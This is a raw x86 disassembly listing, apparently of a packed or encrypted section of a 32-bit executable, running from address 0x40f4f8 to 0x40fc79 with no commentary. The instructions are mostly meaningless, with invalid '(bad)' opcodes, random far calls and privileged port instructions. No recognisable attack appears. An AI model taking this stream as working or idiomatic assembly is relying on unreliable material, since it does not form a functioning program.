  40f4f8:	pop    ds
  40f4f9:	lods   al,BYTE PTR ds:[esi]
  40f4fa:	mov    ah,BYTE PTR [ebx-0x1237f051]
  40f500:	add    DWORD PTR [eax+0x1],ebp
  40f503:	loop   0x40f57b
  40f505:	inc    ebx
  40f506:	int    0xdb
  40f508:	rcl    BYTE PTR [ebx-0x5799e2e2],cl
  40f50e:	jle    0x40f4a1
  40f510:	pop    ebx
  40f511:	push   eax
  40f512:	fmul   DWORD PTR [eax-0x794c18b6]
  40f518:	(bad)  
  40f519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f51a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f51b:	mov    esi,0x26e321e5
  40f520:	push   0xffffffe4
  40f522:	xchg   edi,eax
  40f523:	test   DWORD PTR [eax-0x7bd75af7],ecx
  40f529:	push   ss
  40f52a:	sbb    ebp,DWORD PTR [esi+0x3c06c6a3]
  40f530:	mov    dh,0x14
  40f532:	push   ebp
  40f533:	or     DWORD PTR [ebx+0x3b39320c],0x6e
  40f53a:	mov    al,ds:0x647af676
  40f53f:	cs push edi
  40f541:	test   eax,0xc1d234b8
  40f546:	or     DWORD PTR [esi],esi
  40f548:	sar    BYTE PTR [esi-0x65],1
  40f54b:	mov    ds:0xc9f17191,eax
  40f550:	or     edi,DWORD PTR [edi-0x43f3c44e]
  40f556:	sbb    ch,0xa8
  40f559:	std    
  40f55a:	xor    al,0xf5
  40f55c:	inc    eax
  40f55d:	repnz (bad) 
  40f55f:	xchg   ebp,eax
  40f560:	jge    0x40f540
  40f562:	push   esi
  40f563:	fadd   DWORD PTR [ebp+0x70]
  40f566:	test   al,0x1f
  40f568:	jno    0x40f5dc
  40f56a:	ret    
  40f56b:	jmp    0x2612:0xa681dadf
  40f572:	adc    ecx,DWORD PTR [ebp+0xb]
  40f575:	ret    0xce2f
  40f578:	dec    eax
  40f579:	jecxz  0x40f5b7
  40f57b:	pop    esi
  40f57c:	ret    
  40f57d:	adc    BYTE PTR [esi],bh
  40f57f:	iret   
  40f580:	mov    edx,DWORD PTR [edi-0x20e20922]
  40f586:	test   al,0xdb
  40f588:	xchg   ebp,eax
  40f589:	inc    ebp
  40f58a:	imul   ecx,DWORD PTR [eax+0x6d7e8f86],0x56775bfc
  40f594:	int    0xc6
  40f596:	adc    eax,0x8768e6da
  40f59b:	sbb    ch,BYTE PTR ds:0x133bc929
  40f5a1:	jbe    0x40f5ac
  40f5a3:	xchg   edx,esp
  40f5a5:	dec    ecx
  40f5a6:	retf   
  40f5a7:	call   0x762d:0x47120fc7
  40f5ae:	popf   
  40f5af:	enter  0x31b5,0x5
  40f5b3:	sbb    cl,BYTE PTR [esp+ebp*8+0x1d]
  40f5b7:	mov    ch,0xaa
  40f5b9:	test   DWORD PTR [ecx-0x66],0xd38db743
  40f5c0:	ss push ebx
  40f5c2:	push   ecx
  40f5c3:	xchg   esp,eax
  40f5c4:	or     al,0xb7
  40f5c6:	arpl   WORD PTR [eax],ax
  40f5c8:	cli    
  40f5c9:	mov    cl,BYTE PTR [edi+0x8]
  40f5cc:	pushf  
  40f5cd:	inc    BYTE PTR [edx]
  40f5cf:	mov    ch,BYTE PTR [edi-0x31b5faed]
  40f5d5:	or     ah,0xf4
  40f5d8:	or     al,0x49
  40f5da:	jecxz  0x40f5a5
  40f5dc:	scas   eax,DWORD PTR es:[edi]
  40f5dd:	mov    dh,0x9
  40f5df:	push   edi
  40f5e0:	xchg   edi,eax
  40f5e1:	cmc    
  40f5e2:	in     eax,dx
  40f5e3:	ja     0x40f57b
  40f5e5:	jne    0x40f587
  40f5e7:	cli    
  40f5e8:	scas   al,BYTE PTR es:[edi]
  40f5e9:	popa   
  40f5ea:	das    
  40f5eb:	inc    ecx
  40f5ec:	and    al,0xd6
  40f5ee:	inc    edx
  40f5ef:	lods   eax,DWORD PTR ds:[esi]
  40f5f0:	stos   DWORD PTR es:[edi],eax
  40f5f1:	ret    
  40f5f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5f3:	mov    al,ds:0xca5575ff
  40f5f8:	test   edi,eax
  40f5fa:	inc    ecx
  40f5fb:	sub    BYTE PTR [eax],0xca
  40f5fe:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f600:	icebp  
  40f601:	out    0xc5,eax
  40f603:	adc    eax,0x4387f565
  40f608:	fisttp WORD PTR [esi+0x6c]
  40f60b:	fisttp QWORD PTR [ebp-0x1b4182c9]
  40f611:	push   es
  40f612:	nop
  40f613:	mov    BYTE PTR [ebx],bh
  40f615:	iret   
  40f616:	jmp    0x80:0x3264acb2
  40f61d:	stc    
  40f61e:	imul   ecx,esi,0xd928fe38
  40f624:	enter  0xd46c,0x74
  40f628:	mov    ds:0xf6e02fbf,eax
  40f62d:	dec    edi
  40f62e:	push   ecx
  40f62f:	stc    
  40f630:	sub    ebp,esi
  40f632:	fwait
  40f633:	sbb    al,0x7f
  40f635:	mov    al,ds:0xf69ed8ea
  40f63a:	imul   ebp,edx,0x6a
  40f63d:	sbb    dh,dh
  40f63f:	test   DWORD PTR [ecx],ebx
  40f641:	xchg   edi,eax
  40f642:	mov    ah,0x7e
  40f644:	add    DWORD PTR [eax],ebx
  40f646:	lock xchg edi,eax
  40f648:	test   eax,0xf8017aa0
  40f64d:	sbb    eax,0x898555e4
  40f652:	jp     0x40f6bb
  40f654:	repnz xor eax,0x73f1bd0f
  40f65a:	cmc    
  40f65b:	dec    ecx
  40f65c:	push   0x6
  40f65e:	int    0x23
  40f660:	jbe    0x40f5f4
  40f662:	add    eax,0xc9c1cbe1
  40f667:	call   0xa57:0x8609d134
  40f66e:	jne    0x40f675
  40f670:	aas    
  40f671:	inc    esp
  40f672:	(bad)  
  40f673:	dec    cx
  40f675:	sahf   
  40f676:	(bad)  
  40f677:	retf   0xbf72
  40f67a:	stc    
  40f67b:	or     edi,ebp
  40f67d:	(bad)  
  40f67f:	adc    esi,DWORD PTR [eax+0x25]
  40f682:	fiadd  WORD PTR [edi-0x25]
  40f685:	scas   eax,DWORD PTR es:[edi]
  40f686:	mov    bl,0xb8
  40f688:	mov    esi,es
  40f68a:	dec    ecx
  40f68b:	inc    eax
  40f68c:	fdiv   QWORD PTR ds:0x29d416ee
  40f692:	cdq    
  40f693:	fsubr  DWORD PTR [esi-0x27]
  40f696:	pop    edi
  40f697:	arpl   WORD PTR [edi+0x4fe2d2cc],bx
  40f69d:	mov    ds:0xbd351b19,al
  40f6a2:	mov    cl,0xac
  40f6a4:	out    0xd1,al
  40f6a6:	ss call 0x4dc8:0x951a6e0b
  40f6ae:	adc    al,0x2e
  40f6b0:	xor    DWORD PTR [ecx+ebx*4],eax
  40f6b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6b4:	pop    ebx
  40f6b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6b6:	mov    DWORD PTR [ebp+0x24],esi
  40f6b9:	test   al,0x97
  40f6bb:	mov    esi,0x37e23f85
  40f6c0:	pop    eax
  40f6c1:	mov    eax,0x82f9aa6b
  40f6c6:	fist   DWORD PTR [ebx+esi*1+0xa]
  40f6ca:	loopne 0x40f6c0
  40f6cc:	fnstcw WORD PTR [eax-0x11]
  40f6cf:	or     edi,eax
  40f6d1:	call   0x53ab7509
  40f6d6:	and    DWORD PTR [ecx+0x7a7ea280],0x77
  40f6dd:	jno    0x40f6fd
  40f6df:	xchg   ebx,eax
  40f6e0:	aaa    
  40f6e1:	adc    BYTE PTR [eax+edx*1],cl
  40f6e4:	aaa    
  40f6e5:	mov    cs,WORD PTR [eax]
  40f6e7:	adc    DWORD PTR [ebp+0x7f],eax
  40f6ea:	dec    edi
  40f6eb:	pop    edi
  40f6ec:	iret   
  40f6ed:	push   esi
  40f6ee:	into   
  40f6ef:	mov    edx,0xe60abc83
  40f6f4:	and    BYTE PTR gs:[esi-0x1b],ah
  40f6f8:	sbb    esi,DWORD PTR [ecx-0x792df0cc]
  40f6fe:	ret    0x3910
  40f701:	loop   0x40f72d
  40f703:	pop    ebp
  40f704:	and    BYTE PTR [ecx],0x19
  40f707:	sti    
  40f708:	ins    DWORD PTR es:[edi],dx
  40f709:	add    al,BYTE PTR [ebp+0x7c2e32dd]
  40f70f:	and    dh,BYTE PTR [edx]
  40f711:	out    dx,al
  40f712:	push   0x781be049
  40f717:	pushf  
  40f718:	jmp    0x4b2d:0x21c658ca
  40f71f:	fwait
  40f720:	mov    eax,ds:0x87b6ad4b
  40f725:	sbb    al,0xa0
  40f727:	ds mov edx,0x23b4a6f0
  40f72d:	test   DWORD PTR [ebx-0x58],0x8d60db58
  40f734:	jo     0x40f73d
  40f736:	out    0x62,eax
  40f738:	dec    edi
  40f739:	pop    edx
  40f73a:	outs   dx,BYTE PTR ds:[esi]
  40f73b:	ror    BYTE PTR [esi],1
  40f73d:	and    al,0xa8
  40f73f:	jge    0x40f762
  40f741:	pmaddwd mm1,mm7
  40f744:	call   0x502a:0x8f8ef1d8
  40f74b:	push   ss
  40f74c:	pop    ecx
  40f74d:	xor    al,0x15
  40f74f:	outs   dx,DWORD PTR ds:[esi]
  40f750:	jo     0x40f740
  40f752:	loop   0x40f6e5
  40f754:	int3   
  40f755:	hlt    
  40f756:	inc    ecx
  40f757:	fsubr  DWORD PTR [esi]
  40f759:	mov    edi,0x9f0691bf
  40f75e:	xor    esp,0x52834f6c
  40f764:	and    ebp,DWORD PTR [ebp-0x25]
  40f767:	xor    al,0xc6
  40f769:	xor    bl,BYTE PTR [edi+0x93d566]
  40f76f:	int    0x5b
  40f771:	enter  0xc843,0x14
  40f775:	inc    ebp
  40f776:	das    
  40f777:	loope  0x40f77b
  40f779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f77a:	fs out 0xd,eax
  40f77d:	lock test eax,0x945b494c
  40f783:	jno    0x40f724
  40f785:	outs   dx,BYTE PTR ds:[esi]
  40f786:	add    BYTE PTR [eax+0x1f8b090a],cl
  40f78c:	pusha  
  40f78d:	inc    ebx
  40f78e:	repz inc esi
  40f790:	mov    bh,0xe4
  40f792:	mov    DWORD PTR [edi],0x65a602e1
  40f798:	test   eax,0x4486a6a8
  40f79d:	dec    edi
  40f79e:	sbb    edx,esi
  40f7a0:	dec    edi
  40f7a1:	xchg   edi,eax
  40f7a2:	lahf   
  40f7a3:	call   0x81dd:0x275aff97
  40f7aa:	pop    es
  40f7ab:	jge    0x40f809
  40f7ad:	clc    
  40f7ae:	pop    esp
  40f7af:	pop    esi
  40f7b0:	push   cs
  40f7b1:	push   esi
  40f7b2:	fcomip st,st(1)
  40f7b4:	fistp  DWORD PTR cs:[esi-0x73b6a985]
  40f7bb:	xchg   ebp,eax
  40f7bc:	js     0x40f7d5
  40f7be:	sahf   
  40f7bf:	inc    edi
  40f7c0:	lods   al,BYTE PTR ds:[esi]
  40f7c1:	jp     0x40f7e6
  40f7c3:	ret    0x7c87
  40f7c6:	xchg   edi,eax
  40f7c7:	mov    edx,DWORD PTR [ebp+ebp*1+0x62]
  40f7cb:	mov    ds:0x9b1880ee,al
  40f7d0:	hlt    
  40f7d1:	xor    eax,0x85097c68
  40f7d6:	push   ss
  40f7d7:	or     eax,0x35d7d5db
  40f7dc:	inc    ebp
  40f7dd:	sbb    eax,ebp
  40f7df:	adc    DWORD PTR [ebp-0x2c39b71],0xffffff83
  40f7e6:	outs   dx,DWORD PTR ds:[esi]
  40f7e7:	imul   DWORD PTR [edi-0x5c04cee8]
  40f7ed:	adc    dl,BYTE PTR [edi-0x35dcb975]
  40f7f3:	mov    esi,0x4a20ce04
  40f7f8:	leave  
  40f7f9:	test   al,0xd3
  40f7fb:	rcr    DWORD PTR [eax+0xf0584f8],0x2f
  40f802:	pop    ds
  40f803:	not    esp
  40f805:	mov    bl,0x42
  40f807:	jg     0x40f84d
  40f809:	fistp  QWORD PTR [ebp+0x6e9315d1]
  40f80f:	nop
  40f810:	fiadd  WORD PTR [ebx+edx*1+0x46c66115]
  40f817:	call   0x896324a8
  40f81c:	cdq    
  40f81d:	lahf   
  40f81e:	and    BYTE PTR [ebx],ah
  40f820:	mov    cl,0x5f
  40f822:	push   cs
  40f823:	inc    esp
  40f824:	mov    ah,0xc4
  40f826:	popf   
  40f827:	mov    dh,0xa0
  40f829:	test   al,0xe4
  40f82b:	test   al,0x6e
  40f82d:	add    DWORD PTR [edi],0x7ee718c2
  40f833:	jge    0x40f894
  40f835:	cld    
  40f836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f837:	cmp    eax,0xc60ebaf1
  40f83c:	xchg   ebp,esi
  40f83e:	or     ebx,DWORD PTR [ebp+0x6a]
  40f841:	push   0x6cb525bd
  40f846:	icebp  
  40f847:	out    0x57,al
  40f849:	xchg   ebp,eax
  40f84a:	ins    BYTE PTR es:[edi],dx
  40f84b:	les    eax,FWORD PTR [ecx-0x28b060b0]
  40f851:	std    
  40f852:	and    ebp,DWORD PTR [ebx]
  40f854:	inc    eax
  40f855:	cdq    
  40f856:	pop    ebx
  40f857:	cmp    eax,0x1325cdfe
  40f85c:	ror    al,0x1e
  40f85f:	pop    edi
  40f860:	mov    cl,0x30
  40f862:	(bad)  
  40f863:	(bad)  [eax]
  40f865:	xlat   BYTE PTR ds:[ebx]
  40f866:	pusha  
  40f867:	ror    BYTE PTR ds:0x90ac09e6,1
  40f86d:	jae    0x40f855
  40f86f:	mov    cl,0x28
  40f871:	es js  0x40f8ee
  40f874:	inc    edx
  40f875:	sbb    dh,BYTE PTR [edx]
  40f877:	jno    0x40f85c
  40f879:	retf   0x848
  40f87c:	xchg   esp,eax
  40f87d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f87e:	sti    
  40f87f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f880:	jl     0x40f8ab
  40f882:	sub    al,0x6a
  40f884:	gs push ss
  40f886:	pushf  
  40f887:	std    
  40f888:	xchg   DWORD PTR [ebp-0x59c31aca],esi
  40f88e:	or     al,0xfa
  40f890:	es sahf 
  40f892:	push   esi
  40f893:	(bad)  
  40f894:	cmc    
  40f895:	pop    edi
  40f896:	call   0xc149:0xf345ee31
  40f89d:	sahf   
  40f89e:	inc    eax
  40f89f:	cdq    
  40f8a0:	adc    eax,0x94bd7938
  40f8a5:	mov    edi,0xdff4e65c
  40f8aa:	fld    DWORD PTR [ebx-0x3d631590]
  40f8b0:	push   cs
  40f8b1:	jg     0x40f927
  40f8b3:	mov    dl,0x3a
  40f8b5:	inc    edi
  40f8b6:	test   DWORD PTR [eax],ebp
  40f8b8:	push   esi
  40f8b9:	mov    al,ds:0x944b1985
  40f8be:	sub    al,0x42
  40f8c0:	(bad)  
  40f8c1:	in     al,dx
  40f8c2:	mov    dh,0x25
  40f8c4:	cmp    eax,0xfd10de84
  40f8c9:	add    BYTE PTR [edi],cl
  40f8cb:	xchg   ebp,eax
  40f8cc:	dec    ebp
  40f8cd:	repz (bad) 
  40f8cf:	call   0xb964:0x299efacb
  40f8d6:	jbe    0x40f8ef
  40f8d8:	dec    ebx
  40f8d9:	adc    DWORD PTR [edi],ebx
  40f8db:	add    DWORD PTR [edi-0x72],ebp
  40f8de:	push   ss
  40f8df:	pop    es
  40f8e0:	cmp    esp,DWORD PTR [ebp+eiz*2-0x3591fcbf]
  40f8e7:	jb     0x40f894
  40f8e9:	ja     0x40f8a8
  40f8eb:	fistp  WORD PTR [edx-0x6c]
  40f8ee:	imul   ebp,DWORD PTR [esi-0x6b97e19],0x8cd42cc4
  40f8f8:	pop    es
  40f8f9:	mov    eax,0x74507cee
  40f8fe:	out    0xd2,al
  40f900:	in     al,dx
  40f901:	ret    0x2262
  40f904:	inc    edi
  40f905:	xor    al,BYTE PTR [edi+0x22]
  40f908:	ins    DWORD PTR es:[edi],dx
  40f909:	add    al,0x5d
  40f90b:	dec    ebp
  40f90c:	fisttp DWORD PTR [ebx-0x99b58af]
  40f912:	dec    edx
  40f913:	mov    WORD PTR [ecx],ss
  40f915:	push   esp
  40f916:	cmc    
  40f917:	adc    DWORD PTR [ebx+0x6],ebp
  40f91a:	push   edx
  40f91b:	pop    edi
  40f91c:	ficomp WORD PTR [edx+0x7a17d7e7]
  40f922:	pop    esi
  40f923:	mov    ebx,0xfa62d9e0
  40f928:	js     0x40f90d
  40f92a:	mov    edi,0xe8c39d60
  40f92f:	in     al,dx
  40f930:	or     eax,0x2863de59
  40f935:	push   ss
  40f936:	gs xchg edi,eax
  40f938:	test   eax,0x8f38ba6e
  40f93d:	sub    al,0xe0
  40f93f:	sbb    cl,BYTE PTR [edi+0x68302a19]
  40f945:	cmp    esp,DWORD PTR [ecx*4-0x2b72e395]
  40f94c:	fxch   st(1)
  40f94e:	mov    esp,0x6a2ba313
  40f953:	xchg   esi,esp
  40f955:	adc    DWORD PTR [ebx],ecx
  40f957:	sar    ebp,0x53
  40f95a:	aam    0x2c
  40f95c:	push   ds
  40f95d:	push   0x78
  40f95f:	test   al,0xad
  40f961:	pop    ebp
  40f962:	mov    edx,0x53226d98
  40f967:	clc    
  40f968:	add    BYTE PTR [edi],bl
  40f96a:	fs jnp 0x40f988
  40f96d:	mov    al,0x56
  40f96f:	cli    
  40f970:	sub    BYTE PTR [eax+esi*2+0x335e1270],bh
  40f977:	mov    BYTE PTR [edx],dh
  40f979:	pusha  
  40f97a:	cmp    eax,0xa86ca852
  40f97f:	sub    eax,0xc2e0968
  40f984:	inc    ebx
  40f985:	push   ebp
  40f986:	int    0x86
  40f988:	std    
  40f989:	mov    esi,0xb4384520
  40f98e:	cmp    BYTE PTR [ebx-0xc],ch
  40f991:	pop    eax
  40f992:	push   ecx
  40f993:	dec    edi
  40f994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f995:	mov    eax,0x5713c123
  40f99a:	popf   
  40f99b:	or     ch,ah
  40f99d:	add    al,ch
  40f99f:	mov    WORD PTR [esi-0x36517155],ss
  40f9a5:	jp     0x40f974
  40f9a7:	rdmsr  
  40f9a9:	out    0xc2,eax
  40f9ab:	adc    eax,0x2a7df9c7
  40f9b0:	or     BYTE PTR [ebp+0x5d],ah
  40f9b3:	dec    eax
  40f9b4:	fld    TBYTE PTR [edi+0x7]
  40f9b7:	push   esp
  40f9b8:	inc    ecx
  40f9b9:	and    DWORD PTR [ebx-0x42ca0c38],ebp
  40f9bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9c0:	and    edi,DWORD PTR [ebx-0x36]
  40f9c3:	push   DWORD PTR [esi]
  40f9c5:	xor    eax,0xb9123bcb
  40f9ca:	jp     0x40f9bc
  40f9cc:	stos   DWORD PTR es:[edi],eax
  40f9cd:	loope  0x40f984
  40f9cf:	cdq    
  40f9d0:	mov    ebp,esi
  40f9d2:	push   ds
  40f9d3:	inc    edi
  40f9d4:	js     0x40f992
  40f9d6:	les    esp,FWORD PTR [ebp-0x20]
  40f9d9:	imul   DWORD PTR [edi]
  40f9db:	scas   al,BYTE PTR es:[edi]
  40f9dc:	adc    BYTE PTR [ecx],al
  40f9de:	leave  
  40f9df:	cs (bad) 
  40f9e2:	xor    eax,0x421a6b16
  40f9e7:	mov    ds:0x2e649559,al
  40f9ec:	fcmovnb st,st(1)
  40f9ee:	pcmpeqb mm4,mm2
  40f9f1:	xor    BYTE PTR [edx],ah
  40f9f3:	scas   eax,DWORD PTR es:[edi]
  40f9f4:	stos   DWORD PTR es:[edi],eax
  40f9f5:	mov    bh,0xc7
  40f9f7:	dec    edi
  40f9f8:	stc    
  40f9f9:	sub    bl,bh
  40f9fb:	jbe    0x40f99f
  40f9fd:	sub    DWORD PTR [esi],0x46
  40fa00:	or     DWORD PTR [ecx],esi
  40fa02:	dec    ecx
  40fa03:	sti    
  40fa04:	push   es
  40fa05:	loop   0x40fa3b
  40fa07:	xchg   esi,eax
  40fa08:	outs   dx,DWORD PTR ds:[esi]
  40fa09:	stos   BYTE PTR es:[edi],al
  40fa0a:	adc    bh,BYTE PTR [esi+eiz*4]
  40fa0d:	dec    ecx
  40fa0e:	call   0x482d:0xfb9ed21e
  40fa15:	xlat   BYTE PTR ds:[ebx]
  40fa16:	jno    0x40fa40
  40fa18:	inc    edi
  40fa19:	mov    ds:0x98d08d7a,al
  40fa1e:	sbb    dh,BYTE PTR [ecx+esi*1+0x5a56336e]
  40fa25:	mov    ebp,0x407de63a
  40fa2a:	mov    esp,esp
  40fa2c:	jle    0x40f9fb
  40fa2e:	ficom  WORD PTR [esi]
  40fa30:	xchg   ebx,eax
  40fa31:	aad    0x12
  40fa33:	push   esp
  40fa34:	stc    
  40fa35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa36:	test   BYTE PTR [edi+0x78e91955],0x34
  40fa3d:	sbb    ch,BYTE PTR [eax+0x34]
  40fa40:	sbb    ah,ah
  40fa42:	mov    ecx,DWORD PTR [ecx-0x7c]
  40fa45:	fnstsw WORD PTR [ebp-0x6e58ea6a]
  40fa4b:	jae    0x40fa3c
  40fa4d:	mov    eax,ds:0x3b9a1514
  40fa52:	call   0x2fe7:0xefef8a7e
  40fa59:	pop    eax
  40fa5a:	fld    DWORD PTR [edx+ebx*8-0x4d]
  40fa5e:	ret    
  40fa5f:	pop    edx
  40fa60:	jno    0x40fabc
  40fa62:	sbb    eax,0x90367b4a
  40fa67:	stos   BYTE PTR es:[edi],al
  40fa68:	and    dl,BYTE PTR [edi]
  40fa6a:	ds mov dl,0x69
  40fa6d:	rcl    bh,1
  40fa6f:	mov    ch,0x6a
  40fa71:	int3   
  40fa72:	(bad)  
  40fa73:	add    cl,BYTE PTR [edi+0x5853ab79]
  40fa79:	sub    eax,0x19113982
  40fa7e:	sub    ebp,ebx
  40fa80:	(bad)  
  40fa81:	mov    ?,WORD PTR ds:0x83e1ed32
  40fa87:	dec    esp
  40fa88:	sbb    DWORD PTR [edi+0x4a2c31ca],ebx
  40fa8e:	mov    al,ds:0xe378f86c
  40fa93:	xor    DWORD PTR [ecx+0x7eca83d0],esi
  40fa99:	push   0x4a
  40fa9b:	add    al,0x41
  40fa9e:	scas   al,BYTE PTR es:[edi]
  40fa9f:	std    
  40faa0:	rol    bl,0x69
  40faa3:	inc    eax
  40faa4:	push   edi
  40faa5:	arpl   bx,bx
  40faa7:	clc    
  40faa8:	sub    edi,ecx
  40faaa:	push   ds
  40faab:	add    edi,ebp
  40faad:	jne    0x40fab7
  40faaf:	mov    ah,0xf
  40fab1:	int    0xea
  40fab3:	push   edi
  40fab4:	add    al,0x83
  40fab6:	and    DWORD PTR [esi],eax
  40fab8:	jle    0x40fa6f
  40faba:	iret   
  40fabb:	test   eax,0x74a25bd4
  40fac0:	pop    es
  40fac1:	ret    0x247
  40fac4:	cwde   
  40fac5:	mov    BYTE PTR [eax-0x2e],bh
  40fac8:	mov    esp,0xc30a5b70
  40facd:	in     al,0x61
  40facf:	jle    0x40fa63
  40fad1:	xchg   edi,eax
  40fad2:	push   0xffffff8a
  40fad4:	lods   eax,DWORD PTR ds:[esi]
  40fad5:	out    0xf4,eax
  40fad7:	push   esp
  40fad8:	pop    ecx
  40fad9:	data16 jo 0x40fb1b
  40fadc:	jecxz  0x40fb45
  40fade:	sub    eax,0x14d14f0c
  40fae3:	or     edi,ecx
  40fae5:	pushf  
  40fae6:	pusha  
  40fae7:	aas    
  40fae8:	mov    ecx,0xd2b6070c
  40faed:	sbb    esi,ebx
  40faef:	(bad)  
  40faf0:	pop    edx
  40faf1:	add    BYTE PTR [ebx*1+0x2ad4ce1c],al
  40faf8:	xlat   BYTE PTR ds:[ebx]
  40faf9:	mov    edi,0xabb94d0d
  40fafe:	sub    al,0xc9
  40fb00:	popf   
  40fb01:	shr    DWORD PTR [ecx],cl
  40fb03:	addr16 rcr edx,cl
  40fb06:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40fb08:	cld    
  40fb09:	xor    esi,eax
  40fb0b:	mov    DWORD PTR [ebp+0x1a],esi
  40fb0e:	arpl   bx,dx
  40fb10:	dec    ebx
  40fb11:	out    dx,eax
  40fb12:	push   ss
  40fb13:	scas   al,BYTE PTR es:[edi]
  40fb14:	add    al,0x9a
  40fb16:	add    BYTE PTR [ebx+0xfecdad0],0x91
  40fb1d:	es push cs
  40fb1f:	les    edx,FWORD PTR [eax+0x32]
  40fb22:	mov    eax,0x34592ce7
  40fb27:	(bad)  
  40fb28:	xor    eax,ebx
  40fb2a:	mov    bl,0x43
  40fb2c:	sbb    DWORD PTR [ebx],edx
  40fb2e:	fcom   DWORD PTR [edx-0x1b]
  40fb31:	dec    ebp
  40fb32:	dec    eax
  40fb33:	jmp    0x40fb1d
  40fb35:	icebp  
  40fb36:	hlt    
  40fb37:	or     BYTE PTR [ecx],bh
  40fb39:	mov    BYTE PTR [ebx-0x32],0x3b
  40fb3d:	leave  
  40fb3e:	mov    bh,0xb3
  40fb40:	fdivr  QWORD PTR [ebp+0x49]
  40fb43:	jbe    0x40fb79
  40fb45:	repnz xlat BYTE PTR ds:[ebx]
  40fb47:	sub    eax,0x280b516
  40fb4c:	add    DWORD PTR [ebp-0xf],eax
  40fb4f:	sub    cl,cl
  40fb51:	ins    BYTE PTR es:[edi],dx
  40fb52:	push   0x5
  40fb54:	addr16 popf 
  40fb56:	cdq    
  40fb57:	xor    BYTE PTR [edx],bl
  40fb59:	push   0xffffffed
  40fb5b:	retf   
  40fb5c:	shr    DWORD PTR [esi-0xdf0f2ab],1
  40fb62:	inc    ebp
  40fb63:	cmc    
  40fb64:	(bad)  
  40fb65:	out    0x45,eax
  40fb67:	dec    edx
  40fb68:	sub    DWORD PTR [ebx],esi
  40fb6a:	mov    ch,0x97
  40fb6c:	dec    esi
  40fb6d:	lahf   
  40fb6e:	pop    ecx
  40fb6f:	adc    eax,0xbd07014
  40fb74:	mov    dl,0xc4
  40fb76:	or     al,0x92
  40fb78:	mov    ah,0xce
  40fb7a:	popa   
  40fb7b:	out    0x13,al
  40fb7d:	and    BYTE PTR [esi+ebp*2],bl
  40fb80:	jl     0x40fb18
  40fb82:	dec    eax
  40fb83:	sti    
  40fb84:	xor    BYTE PTR [eax],ch
  40fb86:	test   cl,bh
  40fb88:	aam    0xa7
  40fb8a:	aas    
  40fb8b:	(bad)  
  40fb8c:	push   0x4b
  40fb8e:	in     eax,0xde
  40fb90:	leave  
  40fb91:	xor    eax,0xd5b59f44
  40fb96:	add    ecx,0x18fcf03a
  40fb9c:	or     edi,DWORD PTR [edi-0x3f81bbcf]
  40fba2:	mov    ss,WORD PTR [edi+0x13]
  40fba5:	call   0xd510:0xcd8c28f4
  40fbac:	fadd   DWORD PTR [ebx-0x19]
  40fbaf:	mov    ebx,0xbedd98ef
  40fbb4:	stos   DWORD PTR es:[edi],eax
  40fbb5:	dec    ebp
  40fbb6:	(bad)  
  40fbb7:	nop
  40fbb8:	inc    edx
  40fbb9:	mov    cl,0x6
  40fbbb:	loope  0x40fb53
  40fbbd:	mov    ch,0x97
  40fbbf:	cmp    ch,ch
  40fbc1:	pushf  
  40fbc2:	es and eax,0xc556a402
  40fbc8:	mov    ebx,0x150e235d
  40fbcd:	fmul   DWORD PTR [ecx-0x55]
  40fbd0:	std    
  40fbd1:	(bad)  
  40fbd2:	out    0x25,eax
  40fbd4:	adc    eax,0xf15f8282
  40fbd9:	bound  edi,QWORD PTR [esi+0x5d45036c]
  40fbdf:	xor    BYTE PTR [ecx-0x31],0xb8
  40fbe3:	loop   0x40fc05
  40fbe5:	stc    
  40fbe6:	das    
  40fbe7:	(bad)  
  40fbe8:	mov    ebp,0x1531c1c2
  40fbed:	xchg   esi,eax
  40fbee:	test   al,0x8
  40fbf0:	retf   
  40fbf1:	xchg   edi,eax
  40fbf3:	push   edi
  40fbf5:	mov    ecx,0x22a64cdd
  40fbfa:	mov    eax,ds:0x79d24d89
  40fbff:	adc    ecx,DWORD PTR [esi]
  40fc01:	adc    edx,ecx
  40fc03:	inc    esi
  40fc04:	inc    esi
  40fc05:	cvttps2pi mm7,QWORD PTR [ebx+edi*4]
  40fc09:	cdq    
  40fc0a:	fwait
  40fc0b:	adc    al,0xc1
  40fc0d:	or     edx,ebp
  40fc0f:	pop    eax
  40fc10:	sbb    BYTE PTR [edx-0x793827bc],bh
  40fc16:	jmp    0x30c9:0x21863cc4
  40fc1d:	xor    dl,BYTE PTR [edx-0xfd123b5]
  40fc23:	inc    DWORD PTR [bx+0x19]
  40fc27:	cwde   
  40fc28:	jnp    0x40fc33
  40fc2a:	sbb    ah,BYTE PTR [ebx+0x766cb28a]
  40fc30:	fimul  DWORD PTR [edi]
  40fc32:	and    ah,BYTE PTR [ecx+0x458bbbdd]
  40fc38:	or     esp,DWORD PTR [esp+esi*8+0x7834fcfd]
  40fc3f:	xor    BYTE PTR [edx+0x31313b84],al
  40fc45:	and    bh,BYTE PTR [ecx+edx*1+0x6f]
  40fc49:	inc    edx
  40fc4a:	mov    dh,0xa6
  40fc4c:	or     DWORD PTR [edi],0x31
  40fc4f:	das    
  40fc50:	inc    ecx
  40fc51:	mov    ch,cl
  40fc53:	and    al,0x25
  40fc55:	icebp  
  40fc56:	adc    edx,DWORD PTR [edi]
  40fc58:	push   ebx
  40fc59:	mov    WORD PTR [esp+ecx*1],ss
  40fc5c:	xor    esi,DWORD PTR [eax+edi*4]
  40fc5f:	and    ebp,DWORD PTR [edi+0x3b4bb041]
  40fc65:	sub    DWORD PTR [edx],esp
  40fc67:	mov    cl,0xca
  40fc69:	mov    edi,0xc919294d
  40fc6e:	xor    ch,0x6
  40fc71:	loopne 0x40fc2f
  40fc73:	push   ecx
  40fc74:	out    dx,al
  40fc75:	sbb    BYTE PTR [eax+0x38],0xb2
  40fc79:	push   ebp
